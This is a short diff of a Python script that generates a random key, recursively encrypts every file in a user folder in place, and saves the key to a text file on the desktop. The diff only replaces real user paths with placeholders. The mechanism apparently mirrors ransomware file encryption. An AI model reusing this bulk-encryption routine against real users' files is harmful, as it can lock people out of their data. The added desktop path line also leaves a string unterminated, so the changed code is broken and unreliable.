@@ -34,12 +34,12 @@ if __name__ == '__main__':
     key = get_random_bytes(16)
     print('Encryption key:', key.hex())
 
-    folder_path = ('C:\\Users\mhpc\Desktop\private')
+    folder_path = ("C:\\Users\\username\\foldername")
     for dirpath, dirnames, filenames in os.walk(folder_path):
         for filename in filenames:
             file_path = os.path.join(dirpath, filename)
             encrypt_file(key, file_path)
-desktop = 'C:\\Users\mhpc\Desktop'
+desktop = "C:\\Users\\username\\desktop
 key_file_path = os.path.join(desktop, 'key.txt')
 with open(key_file_path, 'wb') as key_file:
     key_file.write(key)
